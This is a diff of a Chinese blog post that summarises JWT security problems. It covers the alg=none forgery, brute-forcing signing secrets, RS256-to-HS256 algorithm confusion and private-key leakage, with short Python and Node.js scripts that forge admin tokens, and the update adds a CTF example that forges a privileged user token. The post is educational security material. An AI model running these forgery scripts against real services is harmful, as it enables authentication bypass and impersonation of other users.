@@ -23,17 +23,18 @@
   <meta name="author" content="dr0n">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(RFC 7519)。它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象，特别适用于分布式站点的单点登录(SSO)场景。 结构jwt由三部分组成：header、payload、signature，用点.分隔 headerheader用来声明token的类型和签名用的算法">
+    <meta name="description" content="Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(RFC 7519)。它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象，特别适用于分布式站点的单点登录(SSO)场景。 结构jwt由三部分组成：header、payload、signature，用点.分隔 headerheader 用来声明 token 的类型和签名用">
 <meta property="og:type" content="article">
 <meta property="og:title" content="JWT常见安全问题学习总结">
 <meta property="og:url" content="https://www.dr0n.top/posts/40e1eb99/index.html">
 <meta property="og:site_name" content="Dr0n&#39;s blog">
-<meta property="og:description" content="Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(RFC 7519)。它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象，特别适用于分布式站点的单点登录(SSO)场景。 结构jwt由三部分组成：header、payload、signature，用点.分隔 headerheader用来声明token的类型和签名用的算法">
+<meta property="og:description" content="Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(RFC 7519)。它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象，特别适用于分布式站点的单点登录(SSO)场景。 结构jwt由三部分组成：header、payload、signature，用点.分隔 headerheader 用来声明 token 的类型和签名用">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/jwt-1.png">
+<meta property="og:image" content="https://www.dr0n.top/img/summary/jwt-3.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/jwt-2.png">
 <meta property="article:published_time" content="2023-01-05T02:00:00.000Z">
-<meta property="article:modified_time" content="2024-03-21T10:36:55.779Z">
+<meta property="article:modified_time" content="2025-12-29T11:03:28.742Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="总结">
 <meta property="article:tag" content="JWT">
@@ -324,7 +325,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.3k 字
+          1.4k 字
         
       </span>
     
@@ -335,7 +336,7 @@
         
         
         
-          9 分钟
+          10 分钟
         
       </span>
     
@@ -387,13 +388,13 @@
               <div class="markdown-body">
                 
                 <p>Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(<a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc7519">RFC 7519</a>)。它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象，特别适用于分布式站点的单点登录(SSO)场景。</p>
-<h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>jwt由三部分组成：<code>header</code>、<code>payload</code>、<code>signature</code>，用点<code>.</code>分隔</p>
-<h2 id="header"><a href="#header" class="headerlink" title="header"></a>header</h2><p><code>header</code>用来声明<code>token</code>的类型和签名用的算法等</p>
+<h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>jwt由三部分组成：header、payload、signature，用点<code>.</code>分隔</p>
+<h2 id="header"><a href="#header" class="headerlink" title="header"></a>header</h2><p>header 用来声明 token 的类型和签名用的算法等</p>
 <p>示例</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>经过<code>Base64Url</code>编码后构成了<code>JWT</code>的第一部分</p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><code>payload</code>就是存放有效信息的地方</p>
+<p>经过 Base64Url 编码后构成了 JWT 的第一部分</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>payload 就是存放有效信息的地方</p>
 <p>示例</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
 
@@ -401,44 +402,55 @@
 <p>其中已注册声明有7个默认字段，都由官方所定义(<a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc7519#section-4.1">参考rfc7519</a>)，但并不都是必需的</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">iss (issuer)：JWT的发行者<br>exp (expiration time)：过期时间<br>sub (subject)：JWT面向的主题<br>aud (audience)：JWT的用户<br>nbf (Not Before)：生效时间<br>iat (Issued At)：签发时间<br>jti (JWT ID)：JWT唯一标识<br></code></pre></td></tr></table></figure>
 
-<p><code>公共声明</code>：这些可以由使用JWT的人随意定义。但是为了避免冲突，它们应该在IANA JSON Web令牌注册表中定义，或者定义为包含抗冲突命名空间的 URI。<br><code>私人声明</code>：这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，既不是注册声明也不是公共声明</p>
-<p>经过<code>Base64Url</code>编码后构成了<code>JWT</code>的第二部分</p>
+<p>公共声明 ：这些可以由使用JWT的人随意定义。但是为了避免冲突，它们应该在IANA JSON Web令牌注册表中定义，或者定义为包含抗冲突命名空间的 URI。<br>私人声明 ：这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，既不是注册声明也不是公共声明</p>
+<p>经过 Base64Url 编码后构成了 JWT 的第二部分</p>
 <h2 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h2><p>签名用于验证消息在此过程中没有被更改</p>
-<p>这个部分需要<code>Base64Url</code>编码后的<code>header</code>和<code>Base64Url</code>编码后的<code>payload</code>使用<code>.</code>连接，组成字符串，然后通过<code>header</code>中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了<code>jwt</code>的第三部分</p>
-<p>如果要使用<code>HMAC SHA256</code>算法，将按以下方式创建签名</p>
+<p>这个部分需要 Base64Url 编码后的 header 和 Base64Url 编码后的 payload 使用 . 连接，组成字符串，然后通过 header 中声明的加密方式进行加盐 secret 组合加密，然后就构成了 jwt 的第三部分</p>
+<p>如果要使用 HMAC SHA256 算法，将按以下方式创建签名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SHA256">HMACSHA256(<br>  base64UrlEncode(header) + &quot;.&quot; +<br>  base64UrlEncode(payload),<br>  secret)<br></code></pre></td></tr></table></figure>
 
 <p>secret是保存在服务端的，jwt的签发生成也是在服务端的，secret就是用来进行jwt的签发和jwt的验证，所以一旦客户端得知这个secret, 那就意味着客户端可以自我签发jwt了</p>
-<h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>因为<code>payload</code>和<code>header</code>只经过<code>Base64Url</code>编码，如果开发者把一些敏感信息存放到里面，我们可以轻松获得</p>
-<h2 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h2><p>某些服务端并未校验JWT签名，所以，可以尝试修改<code>signature</code>后(或者直接删除<code>signature</code>)看其是否还有效。</p>
+<h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>因为 payload 和 header 只经过 Base64Url 编码，如果开发者把一些敏感信息存放到里面，我们可以轻松获得</p>
+<h2 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h2><p>某些服务端并未校验JWT签名，所以，可以尝试修改 signature 后(或者直接删除 signature )看其是否还有效</p>
 <h2 id="签名算法置空-CVE-2015-2951"><a href="#签名算法置空-CVE-2015-2951" class="headerlink" title="签名算法置空(CVE-2015-2951)"></a>签名算法置空(CVE-2015-2951)</h2><p>我们知道，签名算法可以确保JWT在传输过程中不会被恶意用户所篡改</p>
-<p>但头部中的<code>alg</code>字段却可以改为<code>none</code>，服务端接收到后会将其认定为无加密算法， 于是对<code>signature</code>的检验也就失效了，那么我们就可以随意修改<code>payload</code>部分伪造<code>token</code></p>
-<p>因为<code>jwt.io</code>将<code>alg</code>为<code>none</code>视为恶意行为，所以无法通过在线工具生成JWT，可以用<code>python</code>的<code>jwt</code>库来实现</p>
+<p>但头部中的 alg 字段却可以改为 none ，服务端接收到后会将其认定为无加密算法， 于是对 signature 的检验也就失效了，那么我们就可以随意修改 payload 部分伪造 token</p>
+<p>因为 jwt.io 将 alg 为 none 视为恶意行为，所以无法通过在线工具生成JWT，可以用 python 的 jwt 库来实现</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br><br>token_dict = &#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1674038291</span>,<br>  <span class="hljs-string">&quot;nbf&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;jti&quot;</span>: <span class="hljs-string">&quot;e41ff441b04bf337ab3ca715f64a76e1&quot;</span><br>&#125;<br><br>headers = &#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><br><br>jwt_token = jwt.encode(token_dict,<br>                       <span class="hljs-string">&quot;&quot;</span>,  				 <span class="hljs-comment"># 进行加密签名的密钥</span><br>                       algorithm=<span class="hljs-string">&quot;none&quot;</span>,  	 <span class="hljs-comment"># 指明签名算法方式, 默认也是HS256</span><br>                       headers=headers<br>                       )<br><br><span class="hljs-built_in">print</span>(jwt_token)<br></code></pre></td></tr></table></figure>
 
 <p>运行结果<br><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3NDAzMTA5MSwiZXhwIjoxNjc0MDM4MjkxLCJuYmYiOjE2NzQwMzEwOTEsInN1YiI6ImFkbWluIiwianRpIjoiZTQxZmY0NDFiMDRiZjMzN2FiM2NhNzE1ZjY0YTc2ZTEifQ.</code></p>
-<h2 id="签名密钥爆破"><a href="#签名密钥爆破" class="headerlink" title="签名密钥爆破"></a>签名密钥爆破</h2><p>JWT使用算法对<code>header</code>和<code>payload</code>进行加密，如果我们可以爆破出加密密钥，那么也就可以随意修改<code>token</code>了</p>
+<h2 id="签名密钥爆破"><a href="#签名密钥爆破" class="headerlink" title="签名密钥爆破"></a>签名密钥爆破</h2><p>JWT使用算法对 header 和 payload 进行加密，如果我们可以爆破出加密密钥，那么也就可以随意修改 token 了</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/Ch1ngg/JWTPyCrack">Github-jwt爆破脚本</a></p>
 <p><img src="/img/summary/jwt-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>两个jwt碰撞获取密钥：<a target="_blank" rel="noopener" href="https://github.com/silentsignal/rsa_sign2n/tree/release/standalone">jwt_forgery.py</a></p>
 <h2 id="非对称密码算法-对称密码算法-CVE-2016-10555"><a href="#非对称密码算法-对称密码算法-CVE-2016-10555" class="headerlink" title="非对称密码算法&#x3D;&gt;对称密码算法(CVE-2016-10555)"></a>非对称密码算法&#x3D;&gt;对称密码算法(CVE-2016-10555)</h2><p>JWT的签名加密算法有两种，对称加密算法和非对称加密算法</p>
 <p>对称加密算法比如HS256使用密钥为所有消息进行签名和验证<br>非对称加密算法比如RS256使用私钥对消息进行签名并使用公钥进行身份验证</p>
-<p>如果我们获取到了公钥，可以将头部中的算法修改从<code>RS256</code>更改为<code>HS256</code>，这样后端代码就会使用<code>RSA</code>公钥+<code>HS256</code>算法进行签名验证</p>
-<p>js代码实现例子</p>
+<p>如果我们获取到了公钥，可以将头部中的算法修改从 RS256 更改为 HS256 ，这样后端代码就会使用 RSA 公钥+ HS256 算法进行签名验证</p>
+<p><strong>js代码实现</strong></p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;public.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure>
 
 
-<p>python代码实现例子</p>
-<p>不过用python跑的时候因为jwt版本过高会报错<code>The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret</code><br>解决方法：<code>pip install pyjwt==0.4.3</code></p>
+<p><strong>python代码实现</strong></p>
+<p>不过用python跑的时候因为jwt版本过高会报错 The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret</p>
+<p>解决方法： pip install pyjwt&#x3D;&#x3D;0.4.3</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>public = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;public.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-built_in">print</span>(jwt.encode(&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;, key=public, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>))<br></code></pre></td></tr></table></figure>
 
-<h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><p>因为<code>非对称加密算法</code>利用私钥生成<code>jwt</code>，利用公钥解密<code>jwt</code>，所以我们只要有私钥然后自己就可以重新生成</p>
+
+<hr>
+<p>例如2025 ccb Deprecated</p>
+<p><img src="/img/summary/jwt-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>decode的时候支持使用非对称RS256和对称HS256，但是签名的时候用的是非对称加密RS256</p>
+<p>如果能拿到公钥，那么就可以任意身份伪造（可以用上面的两个jwt碰撞获取密钥）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> publicKey  = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;./b3ec3db187fa955c_65537_x509.pem&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>data=&#123;<br>    <span class="hljs-attr">username</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-attr">priviledge</span>:<span class="hljs-string">&#x27;File-Priviledged-User&#x27;</span><br>&#125;<br>data = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(data);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( jwt.<span class="hljs-title function_">sign</span>(data, publicKey, &#123; <span class="hljs-attr">algorithm</span>:<span class="hljs-string">&#x27;HS256&#x27;</span>&#125;))<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><p>因为 非对称加密算法 利用私钥生成 jwt ，利用公钥解密 jwt ，所以我们只要有私钥然后自己就可以重新生成</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure>
 
-<p>如果运行报错<code>Error: secretOrPrivateKey has a minimum key size of 2048 bits for RS256</code><br>可以强行注释<code>node_modules\jsonwebtoken\sign.js</code>中对于密钥长度的判断</p>
+<p>如果运行报错 Error: secretOrPrivateKey has a minimum key size of 2048 bits for RS256<br>可以强行注释 node_modules\jsonwebtoken\sign.js 中对于密钥长度的判断</p>
 <p><img src="/img/summary/jwt-2.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>听说还有通过KID实现任意文件读取，注入等操作，CVE-2018-0114，CVE-2022-39227，下次抽空研究下</p>
-<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a target="_blank" rel="noopener" href="https://jwt.io/">jwtio</a><br><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">jwt_tool</a><br><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p>
-<p>参考文章：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2338">JSON Web Token (JWT) 攻击技巧</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/14468030.html">JWT原理及常见攻击方式</a><br><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/jwt%E6%80%BB%E7%BB%93/">JWT总结</a><br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1990">CVE-2022-39227漏洞分析</a></p>
+<hr>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://jwt.io/">jwtio</a><br><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">jwt_tool</a><br><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2338">JSON Web Token (JWT) 攻击技巧</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/14468030.html">JWT原理及常见攻击方式</a><br><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/jwt%E6%80%BB%E7%BB%93/">JWT总结</a><br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1990">CVE-2022-39227漏洞分析</a></p>
 
                 
               </div>
@@ -505,7 +517,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年3月21日</div>
+          <div>2025年12月29日</div>
         </div>
       
       
